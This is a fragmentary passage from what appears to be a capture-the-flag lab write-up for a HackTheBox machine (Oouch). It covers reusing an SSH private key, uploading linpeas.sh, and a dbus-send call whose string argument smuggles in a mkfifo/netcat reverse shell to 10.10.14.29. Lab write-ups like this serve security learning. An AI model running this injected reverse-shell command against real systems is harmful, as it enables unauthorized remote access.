...
My question was: from were is this login?<br>  
...
<center>Now I can try get the id\_rsa</center>  
...
<center>I "cp" it to a file called id\_rsa and "chmod 600 id\_rsa"</center>  
...
scp -i id\_rsa linpeas.sh qtc@10.10.10.177<br>  
...
<hr>  
<center>dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block </br>"string:;rm /tmp/.66; mkfifo /tmp/.66; cat /tmp/.66 \| /bin/bash -i 2>&1 \| nc 10.10.14.29 666 \>/tmp/.66;"</center>
